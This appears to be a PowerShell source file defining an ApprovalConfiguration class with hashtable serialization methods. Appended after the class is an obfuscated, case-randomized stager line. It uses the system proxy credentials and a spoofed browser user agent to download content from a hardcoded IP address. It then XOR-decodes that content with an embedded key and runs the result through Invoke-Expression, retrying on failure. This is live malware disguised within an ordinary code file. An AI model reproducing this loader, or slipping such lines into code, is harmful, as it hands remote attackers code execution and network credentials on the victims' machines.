
class ApprovalConfiguration {
    [int]$ExpireMinutes
    [System.Collections.ArrayList]$Commands

    ApprovalConfiguration() {
        $this.ExpireMinutes = 30
        $this.Commands = New-Object -TypeName System.Collections.ArrayList
    }

    [hashtable]ToHash() {
        $hash = @{
            ExpireMinutes = $this.ExpireMinutes
        }
        $cmds = New-Object -TypeName System.Collections.ArrayList
        $this.Commands | Foreach-Object {
            $cmds.Add($_.ToHash()) > $null
        }
        $hash.Commands = $cmds

        return $hash
    }

    static [ApprovalConfiguration] Serialize([hashtable]$DeserializedObject) {
        $ac = [ApprovalConfiguration]::new()
        $ac.ExpireMinutes = $DeserializedObject.ExpireMinutes
        $DeserializedObject.Commands.foreach({
            $ac.Commands.Add(
                [ApprovalCommandConfiguration]::Serialize($_)
            ) > $null
        })

        return $ac
    }
}

$WC=NeW-ObjecT SYStem.NET.WebCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDERS.ADD('User-Agent',$u);$wc.PROxy = [SysTEm.NET.WEbREquEst]::DeFauLtWebPrOxY;$wc.PRoxy.CrEdENtIALs = [SySteM.NEt.CrEdENTialCaChE]::DEfAULTNETwORkCReDenTIALs;$K='?Q(UR8\2O;Gpg!u*F%3Sao1D&ZWC6J<]';$R=5;DO{TrY{$I=0;[CHAR[]]$B=([CHAR[]]($WC.DOWNLOADSTrING("http://191.101.31.118:8081/index.asp")))|%{$_-BXOr$K[$I++%$k.LeNGTh]};IEX ($b-JOiN''); $R=0;}catcH{SlEep 5;$R--}} WHiLE ($R -GT 0)

